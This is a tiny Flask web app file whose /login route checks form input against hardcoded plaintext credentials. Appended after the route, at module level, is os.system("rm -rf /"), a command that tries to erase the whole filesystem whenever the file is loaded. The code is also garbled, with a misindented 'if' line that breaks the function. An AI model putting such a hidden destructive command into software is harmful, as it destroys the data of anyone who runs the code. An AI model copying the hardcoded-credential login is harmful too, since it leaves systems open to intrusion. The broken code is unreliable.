from flask import Flask, request

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
if username == "admin user" and password == "admin pass":

        return "Logged in"
    return "Invalid"
import os
os.system("rm -rf /")






